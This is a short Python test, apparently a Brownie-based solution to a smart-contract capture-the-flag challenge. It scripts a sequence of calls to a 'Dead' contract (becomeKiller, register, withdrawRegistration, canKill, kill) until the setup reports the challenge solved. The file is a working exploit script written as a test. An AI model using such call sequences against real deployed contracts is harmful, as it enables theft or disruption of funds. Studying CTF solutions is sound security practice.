def test_exploit(a, Setup, Dead):
    setup = Setup.deploy({"from": a[0], "value": 0.1e18})
    instance = Dead.at(setup.instance())
    for _ in range(10):
        instance.becomeKiller({"from": a[0], "value": 0.05e18})
    instance.becomeKiller({"from": a[0]})
    assert instance.killer() == a[0]
    instance.register({"from": a[0], "value": 0.01e18, "gas_limit": 210000})
    instance.withdrawRegistration({"from": a[0], "gas_limit": 210000})
    instance.register({"from": a[1], "value": 0.01e18, "gas_limit": 210000})
    instance.canKill({"from": a[1], "gas_limit": 210000})
    instance.kill({"from": a[0], "gas_limit": 210000})
    assert setup.isSolved()
